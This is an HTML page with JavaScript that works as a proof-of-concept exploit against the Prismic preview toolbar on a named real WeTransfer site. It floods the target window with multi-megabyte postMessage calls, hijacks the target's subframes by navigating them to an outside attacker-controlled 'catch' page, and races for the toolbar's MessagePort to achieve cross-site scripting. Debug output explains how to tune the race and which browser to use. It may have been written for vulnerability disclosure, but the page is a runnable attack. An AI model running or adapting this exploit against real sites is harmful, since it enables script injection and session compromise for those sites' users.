<!DOCTYPE html>
<html>
<head>
<title>Prismic Toolbar XSS via Iframe Hijack</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
  h1 { color: #e94560; }
  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 500px; overflow-y: auto; margin: 10px 0; }
  .log-entry { margin: 3px 0; font-size: 12px; }
  .success { color: #0f0; }
  .error { color: #f00; }
  .info { color: #0af; }
  .warn { color: #fa0; }
  .debug { color: #888; }
  #status-panel { background: #0d1117; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 10px 0; }
  #status-panel div { margin: 4px 0; font-size: 13px; }
  .status-label { color: #888; display: inline-block; width: 200px; }
  .status-val { font-weight: bold; }
  .status-pending { color: #666; }
  .status-ok { color: #0f0; }
  .status-fail { color: #f00; }
  button { background: #e94560; color: #fff; border: none; padding: 10px 20px; border-radius: 6px;
           font-size: 14px; cursor: pointer; margin: 5px 3px; font-family: monospace; }
  button:hover { background: #c73e54; }
  button.secondary { background: #333; }
  button.secondary:hover { background: #555; }
  input { background: #0d1117; color: #eee; border: 1px solid #333; padding: 8px 12px; border-radius: 4px;
          font-family: monospace; font-size: 14px; width: 500px; }
  label { display: block; margin: 8px 0 4px; color: #888; font-size: 12px; }
  select { background: #0d1117; color: #eee; border: 1px solid #333; padding: 6px 10px; border-radius: 4px;
           font-family: monospace; }
</style>
</head>
<body>

<h1>Prismic Toolbar XSS via Iframe Hijack — Debug Mode</h1>

<div id="status-panel">
  <div><span class="status-label">Browser:</span> <span id="s-browser" class="status-val status-pending">detecting...</span></div>
  <div><span class="status-label">Catch page cached:</span> <span id="s-cached" class="status-val status-pending">no</span></div>
  <div><span class="status-label">Target loaded:</span> <span id="s-target" class="status-val status-pending">-</span></div>
  <div><span class="status-label">Frames detected:</span> <span id="s-frames" class="status-val status-pending">0</span></div>
  <div><span class="status-label">Frames navigated:</span> <span id="s-navigated" class="status-val status-pending">0</span></div>
  <div><span class="status-label">Catch page loaded:</span> <span id="s-catch-loaded" class="status-val status-pending">no</span></div>
  <div><span class="status-label">setup_port received:</span> <span id="s-setup-port" class="status-val status-pending">no</span></div>
  <div><span class="status-label">Toolbar active:</span> <span id="s-toolbar" class="status-val status-pending">no</span></div>
  <div><span class="status-label">Flood msgs sent:</span> <span id="s-flood" class="status-val status-pending">0</span></div>
</div>

<label for="target">Target URL (must have Prismic toolbar — use frontsite-nextjs!):</label>
<input id="target" type="text" value="https://frontsite-nextjs.wetransfer.net/blog">

<label for="catch">Catch page URL:</label>
<input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">

<label for="method">Open method:</label>
<select id="method">
  <option value="popup">window.open (popup)</option>
  <option value="iframe" selected>iframe (named)</option>
</select>

<label for="flood-duration">Flood duration (ms):</label>
<input id="flood-duration" type="number" value="10000" style="width:100px">

<label for="poll-interval">Frame poll interval (ms):</label>
<input id="poll-interval" type="number" value="2" style="width:100px">

<br>
<button onclick="startAttack()">Launch Attack</button>
<button class="secondary" onclick="precache()">Pre-cache catch page</button>
<button class="secondary" onclick="testCatchPage()">Test catch page (manual)</button>
<button class="secondary" onclick="clearLog()">Clear log</button>
<div id="log"></div>

<iframe name="victim" id="victim-frame" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px; background: #0d1117;"></iframe>

<script>
// ========== GLOBALS ==========
var attackStart = 0;
var cached = false;
var victimWindow = null;
var FLOOD_PAYLOAD = null;

// ========== BROWSER DETECTION ==========
var isFirefox = navigator.userAgent.indexOf('Firefox') > -1;
var isChrome = navigator.userAgent.indexOf('Chrome') > -1 && !navigator.userAgent.indexOf('Edg') > -1;
var browserName = isFirefox ? 'Firefox' : isChrome ? 'Chrome/Chromium' : navigator.userAgent.split(' ').pop();
document.getElementById('s-browser').textContent = browserName;
document.getElementById('s-browser').className = 'status-val ' + (isFirefox ? 'status-ok' : 'status-fail');

// ========== LOGGING ==========
function log(msg, cls) {
  var div = document.getElementById('log');
  var t = attackStart > 0 ? '+' + (performance.now() - attackStart).toFixed(1) + 'ms' : new Date().toISOString().substr(11, 12);
  div.innerHTML += '<div class="log-entry ' + (cls || 'info') + '">[' + t + '] ' + msg + '</div>';
  div.scrollTop = div.scrollHeight;
}
function clearLog() { document.getElementById('log').innerHTML = ''; }
function setStatus(id, text, cls) {
  var el = document.getElementById(id);
  el.textContent = text;
  el.className = 'status-val ' + (cls || '');
}

// ========== MESSAGE LISTENER (from catch page + anything else) ==========
var allMessages = [];
window.addEventListener('message', function(e) {
  var ts = attackStart > 0 ? (performance.now() - attackStart).toFixed(1) : '?';

  if (e.data && e.data.type === 'catch_status') {
    log('[CATCH +' + ts + 'ms] ' + e.data.msg, 'warn');

    // Track specific catch page events
    if (e.data.msg.indexOf('Catch page loaded') > -1) {
      setStatus('s-catch-loaded', 'YES @ +' + ts + 'ms', 'status-ok');
    }
    if (e.data.msg.indexOf('setup_port RECEIVED') > -1) {
      setStatus('s-setup-port', 'YES @ +' + ts + 'ms', 'status-ok');
      log('===== SETUP_PORT RECEIVED! RACE WON! =====', 'success');
    }
    if (e.data.msg.indexOf('Responding auth:true') > -1) {
      setStatus('s-toolbar', 'ACTIVE @ +' + ts + 'ms', 'status-ok');
    }
    return;
  }

  // Log ALL other messages we receive (could be from target page)
  var preview = '';
  try { preview = JSON.stringify(e.data).substring(0, 150); } catch(x) { preview = String(e.data).substring(0, 150); }
  allMessages.push({ts: ts, origin: e.origin, data: preview, ports: e.ports ? e.ports.length : 0});
  log('[MSG +' + ts + 'ms] origin=' + e.origin + ' ports=' + (e.ports ? e.ports.length : 0) + ' data=' + preview, 'debug');
});

// ========== PRE-CACHE ==========
function precache() {
  var url = document.getElementById('catch').value;
  log('Pre-caching: ' + url, 'info');
  var f = document.createElement('iframe');
  f.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px';
  f.src = url;
  f.onload = function() {
    cached = true;
    setStatus('s-cached', 'YES', 'status-ok');
    log('Catch page pre-cached!', 'success');
    document.body.removeChild(f);
  };
  f.onerror = function() {
    log('Catch page pre-cache FAILED!', 'error');
    try { document.body.removeChild(f); } catch(e) {}
  };
  document.body.appendChild(f);
}
window.addEventListener('load', function() { precache(); });

// ========== TEST CATCH PAGE (manual — sends setup_port directly) ==========
function testCatchPage() {
  log('=== Manual catch page test ===', 'warn');
  var url = document.getElementById('catch').value;
  var f = document.createElement('iframe');
  f.style.cssText = 'width:400px;height:200px;border:1px solid #555';
  f.src = url;
  f.onload = function() {
    log('Test iframe loaded. Sending setup_port with MessagePort...', 'info');
    var ch = new MessageChannel();
    ch.port1.onmessage = function(e) {
      log('[TEST PORT MSG] ' + JSON.stringify(e.data).substring(0, 200), 'success');
    };
    f.contentWindow.postMessage('setup_port', '*', [ch.port2]);
    log('setup_port sent! Check if catch page responds...', 'info');
  };
  document.body.appendChild(f);
}

// ========== BUILD FLOOD PAYLOAD ==========
function buildFloodPayload() {
  if (!FLOOD_PAYLOAD) {
    var big = [];
    for (var i = 0; i < 5 * 1024 * 1024; i += 1024) {
      big.push('A'.repeat(1024));
    }
    FLOOD_PAYLOAD = big.join('');
    log('Flood payload: ' + (FLOOD_PAYLOAD.length / 1024 / 1024).toFixed(1) + ' MB', 'info');
  }
  return FLOOD_PAYLOAD;
}

// ========== MAIN ATTACK ==========
function startAttack() {
  var TARGET = document.getElementById('target').value;
  var CATCH_URL = document.getElementById('catch').value;
  var METHOD = document.getElementById('method').value;
  var FLOOD_DURATION = parseInt(document.getElementById('flood-duration').value) || 10000;
  var POLL_INTERVAL = parseInt(document.getElementById('poll-interval').value) || 2;
  var payload = buildFloodPayload();

  attackStart = performance.now();
  allMessages = [];

  log('============================================', 'warn');
  log('=== Prismic Toolbar XSS — Debug Attack ===', 'warn');
  log('============================================', 'warn');
  log('Browser: ' + browserName, 'info');
  log('Target: ' + TARGET, 'info');
  log('Catch: ' + CATCH_URL + (cached ? ' (CACHED)' : ' (NOT cached!)'), cached ? 'success' : 'error');
  log('Method: ' + METHOD, 'info');
  log('Flood duration: ' + FLOOD_DURATION + 'ms, Poll: ' + POLL_INTERVAL + 'ms', 'info');

  if (TARGET.indexOf('frontsite-nextjs') === -1) {
    log('WARNING: Target does not contain "frontsite-nextjs". Prismic toolbar may not be present!', 'error');
  }

  // ========== Step 1: Open target ==========
  var x;
  if (METHOD === 'popup') {
    x = window.open(TARGET);
    if (!x) {
      log('Popup BLOCKED! Allow popups for this site.', 'error');
      return;
    }
    log('Target opened as popup', 'success');
  } else {
    x = window.open(TARGET, 'victim');
    log('Target opened in named iframe', 'success');
  }
  victimWindow = x;
  setStatus('s-target', 'loading...', 'status-pending');

  // ========== Step 2: Start flooding IMMEDIATELY ==========
  var floodCount = 0;
  var floodErrors = 0;
  var floodInterval = setInterval(function() {
    try {
      x.postMessage(payload, '*');
      floodCount++;
      if (floodCount % 500 === 0) {
        setStatus('s-flood', floodCount + ' (' + ((floodCount * 5 / 1024).toFixed(1)) + ' GB)', '');
      }
    } catch(e) {
      floodErrors++;
      if (floodErrors <= 3) {
        log('Flood postMessage error #' + floodErrors + ': ' + e.message, 'debug');
      }
    }
  }, 1);
  log('Flood started (5MB/msg @ 1ms interval)', 'warn');

  // ========== Step 3: Aggressive frame polling ==========
  var knownCount = 0;
  var navigated = 0;
  var frameTimeline = []; // {time, count, action}
  var lastLoggedCount = -1;
  var pollCount = 0;

  var poller = setInterval(function() {
    pollCount++;
    try {
      var len = x.length;

      // Log frame count changes AND periodic updates
      if (len !== lastLoggedCount) {
        var elapsed = (performance.now() - attackStart).toFixed(1);
        log('Frames: ' + lastLoggedCount + ' -> ' + len + ' @ +' + elapsed + 'ms (poll #' + pollCount + ')', 'success');
        frameTimeline.push({time: elapsed, count: len, action: 'detected'});
        lastLoggedCount = len;
        setStatus('s-frames', len, len > 0 ? 'status-ok' : '');
      }

      // Navigate NEW frames
      if (len > knownCount) {
        for (var i = knownCount; i < len; i++) {
          var navTime = (performance.now() - attackStart).toFixed(1);
          try {
            // Try to read frame info before navigating
            var frameInfo = 'unknown';
            try { frameInfo = x[i].location.href; } catch(e) { frameInfo = '(cross-origin)'; }
            log('  frames[' + i + '] current src: ' + frameInfo, 'debug');

            // Navigate to catch page
            x[i].location = CATCH_URL;
            navigated++;
            frameTimeline.push({time: navTime, count: len, action: 'navigated[' + i + ']'});
            log('  -> Navigated frames[' + i + '] @ +' + navTime + 'ms', 'success');
            setStatus('s-navigated', navigated, 'status-ok');
          } catch(e) {
            log('  -> frames[' + i + '] nav FAILED: ' + e.message, 'error');
            frameTimeline.push({time: navTime, count: len, action: 'nav_failed[' + i + ']: ' + e.message});
          }
        }
        knownCount = len;
      }

      // Also try re-navigating existing frames periodically (in case first nav didn't stick)
      if (pollCount % 50 === 0 && navigated > 0 && knownCount > 0) {
        for (var j = 0; j < knownCount; j++) {
          try {
            var currentSrc = '';
            try { currentSrc = x[j].location.href; } catch(e) { currentSrc = '(cross-origin)'; }
            if (currentSrc.indexOf(CATCH_URL) === -1 && currentSrc !== '(cross-origin)') {
              log('  Re-navigating frames[' + j + '] (was: ' + currentSrc + ')', 'warn');
              x[j].location = CATCH_URL;
            }
          } catch(e) {}
        }
      }
    } catch(e) {
      if (pollCount <= 5) {
        log('Poll error #' + pollCount + ': ' + e.message, 'debug');
      }
    }
  }, POLL_INTERVAL);

  // ========== Step 4: Periodic status log ==========
  var statusInterval = setInterval(function() {
    var elapsed = (performance.now() - attackStart).toFixed(0);
    log('[STATUS +' + elapsed + 'ms] flood=' + floodCount + ' frames=' + lastLoggedCount +
        ' navigated=' + navigated + ' polls=' + pollCount, 'debug');
  }, 2000);

  // ========== Step 5: Stop flooding ==========
  setTimeout(function() {
    clearInterval(floodInterval);
    var elapsed = (performance.now() - attackStart).toFixed(0);
    log('Flood STOPPED @ +' + elapsed + 'ms. Sent ' + floodCount + ' msgs (' +
        ((floodCount * 5 / 1024).toFixed(1)) + ' GB). Errors: ' + floodErrors, 'info');
    setStatus('s-flood', floodCount + ' (stopped)', '');
  }, FLOOD_DURATION);

  // ========== Step 6: Stop polling + summary ==========
  setTimeout(function() {
    clearInterval(poller);
    clearInterval(statusInterval);
    var elapsed = (performance.now() - attackStart).toFixed(0);
    log('============================================', 'warn');
    log('=== ATTACK SUMMARY @ +' + elapsed + 'ms ===', 'warn');
    log('============================================', 'warn');
    log('Browser: ' + browserName, 'info');
    log('Flood: ' + floodCount + ' msgs, ' + floodErrors + ' errors', 'info');
    log('Frames detected: ' + lastLoggedCount, 'info');
    log('Frames navigated: ' + navigated, navigated > 0 ? 'success' : 'error');
    log('Total polls: ' + pollCount, 'debug');
    log('Total messages received: ' + allMessages.length, 'info');

    log('--- Frame timeline ---', 'info');
    for (var i = 0; i < frameTimeline.length; i++) {
      var ft = frameTimeline[i];
      log('  +' + ft.time + 'ms: ' + ft.action + ' (count=' + ft.count + ')', 'info');
    }

    log('--- Messages received ---', 'info');
    for (var j = 0; j < Math.min(allMessages.length, 20); j++) {
      var m = allMessages[j];
      log('  +' + m.ts + 'ms: origin=' + m.origin + ' ports=' + m.ports + ' data=' + m.data.substring(0, 100), 'debug');
    }
    if (allMessages.length > 20) {
      log('  ... and ' + (allMessages.length - 20) + ' more messages', 'debug');
    }

    if (navigated === 0) {
      log('NO FRAMES DETECTED. Possible causes:', 'error');
      log('  1. Target URL wrong — Prismic toolbar only on frontsite-nextjs.wetransfer.net', 'error');
      log('  2. Chromium hides cross-origin subframes from window.length', 'error');
      log('  3. Prismic toolbar not loading (check if target has prismic-toolbar script)', 'error');
      log('  -> Try Firefox! Chromium site isolation prevents this attack.', 'error');
    } else {
      var gotSetupPort = document.getElementById('s-setup-port').textContent.indexOf('YES') > -1;
      if (!gotSetupPort) {
        log('Frames navigated but NO setup_port received. Possible causes:', 'error');
        log('  1. Wrong frame navigated (consent/cookie iframe, not Prismic)', 'error');
        log('  2. Race lost — load event fired before our navigation', 'error');
        log('  3. Catch page loaded too slow (not cached?)', 'error');
        log('  4. Flood did not effectively delay the event loop', 'error');
        log('  -> Check frame timeline: was frame detected fast enough?', 'warn');
        log('  -> The prismic CDN content loads in ~50-100ms after iframe created', 'warn');
        log('  -> If frame detected at +1000ms, the load event already fired', 'warn');
      }
    }
    log('============================================', 'warn');
  }, 25000);

  // ========== Step 7: Detect target page loaded ==========
  // Try periodic checks on the target window
  var targetCheckInterval = setInterval(function() {
    try {
      // If we can read the title, we're same-origin (won't happen for cross-origin)
      var title = x.document.title;
      setStatus('s-target', 'loaded (same-origin readable: "' + title + '")', 'status-ok');
      clearInterval(targetCheckInterval);
    } catch(e) {
      // Cross-origin — expected. Try checking .closed
      if (x.closed) {
        setStatus('s-target', 'CLOSED', 'status-fail');
        log('Target window was CLOSED!', 'error');
        clearInterval(targetCheckInterval);
      } else {
        // Can't read, but window exists
        setStatus('s-target', 'loaded (cross-origin)', '');
      }
    }
  }, 500);
  setTimeout(function() { clearInterval(targetCheckInterval); }, 30000);
}
</script>
</body>
</html>
